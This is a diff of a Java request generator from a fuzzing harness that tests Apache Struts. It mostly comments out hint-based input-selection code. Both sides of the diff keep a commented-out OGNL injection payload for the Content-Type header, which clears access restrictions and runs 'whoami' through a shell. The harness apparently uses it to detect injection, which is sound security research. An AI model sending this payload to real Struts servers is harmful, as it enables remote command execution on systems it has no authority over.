@@ -239,41 +239,41 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
 //
 //        this.OGNLInjectionDone = false;
 
-        String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
-
-
-        String word ="";
+//        String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
+//
+//
+         String word ="";
 
         int choice = random.nextInt(65535);
         boolean coin = random.nextBoolean();
 
-        if (hints != null && hints.length > 0) {
+        if (false) { //hints != null && hints.length > 0) {
 
-//            if(coin) {
-                System.out.println("HINTS WAS NOT NULL FOR CONTENT TYPE! RECEIVED STRINGS");
-                for(int i = 0; i < hints.length; i++) {
-                    System.out.println(hints[i]);
-                }
-                choice = choice % hints.length;
-
-                StringEqualsHintingInputStream.hintUsedInCurrentInput = true;
-
-            choice = random.nextInt(3);
-            switch (choice) {
+////            if(coin) {
+//                System.out.println("HINTS WAS NOT NULL FOR CONTENT TYPE! RECEIVED STRINGS");
+//                for(int i = 0; i < hints.length; i++) {
+//                    System.out.println(hints[i]);
+//                }
+//                choice = choice % hints.length;
 //
-//                    case 0:
-//                        word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
-//                        break;
-                case 0:
-                    word = "(multipart/form-data)";
-                    break;
-                case 1:
-                    word = "{multipart/form-data}";
-                    break;
-                case 2:
-                    word = "[multipart/form-data]";
-                    break;
-            }
+//                StringEqualsHintingInputStream.hintUsedInCurrentInput = true;
+//
+//            choice = random.nextInt(3);
+//            switch (choice) {
+////
+////                    case 0:
+////                        word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
+////                        break;
+//                case 0:
+//                    word = "(multipart/form-data)";
+//                    break;
+//                case 1:
+//                    word = "{multipart/form-data}";
+//                    break;
+//                case 2:
+//                    word = "[multipart/form-data]";
+//                    break;
+//            }
 
 //            }
         }
@@ -398,42 +398,42 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
         ArrayList<String> urlVals = getDictionaryValues("dictionaries/struts-showcase-validUrls.dict");
 
 
-        String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
+        //String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
 
-        boolean coin = random.nextBoolean();
-        if(coin) {
-            if (hints != null && hints.length > 0) {
-                System.out.println("HINTS WAS NOT NULL FOR URL!! RECEIVED STRINGS");
-                for (int i = 0; i < hints.length; i++) {
-                    System.out.println(hints[i]);
-                }
-            }
-        }
+//        boolean coin = random.nextBoolean();
+//        if(coin) {
+//            if (hints != null && hints.length > 0) {
+//                System.out.println("HINTS WAS NOT NULL FOR URL!! RECEIVED STRINGS");
+//                for (int i = 0; i < hints.length; i++) {
+//                    System.out.println(hints[i]);
+//                }
+//            }
+//        }
 
 
         String url = chooseAndTaint(urlVals, random);
 
 
-
-        hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
-
+//
+//        hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
+//
         String result = "";
         int choice = random.nextInt(65535);
-
-
-        if (false && hints != null && hints.length > 0) {
-            coin = random.nextBoolean();
-            if(coin) {
-                System.out.println("HINTS WAS NOT NULL FOR REQ TYPE!! RECEIVED STRINGS");
-                for (int i = 0; i < hints.length; i++) {
-                    System.out.println(hints[i]);
-                }
-                choice = choice % hints.length;
-                result = hints[choice];
-            }
-        }
-
-        else {
+//
+//
+//        if (false && hints != null && hints.length > 0) {
+//            coin = random.nextBoolean();
+//            if(coin) {
+//                System.out.println("HINTS WAS NOT NULL FOR REQ TYPE!! RECEIVED STRINGS");
+//                for (int i = 0; i < hints.length; i++) {
+//                    System.out.println(hints[i]);
+//                }
+//                choice = choice % hints.length;
+//                result = hints[choice];
+//            }
+//        }
+//
+//        else {
             choice = random.nextInt(2);
             switch (choice) {
                 case 0:
@@ -453,7 +453,7 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
                     break;
             }
 
-        }
+        //}
 
         result = applyTaints(result, choice);
         result += (" " + url + " HTTP/1.1");
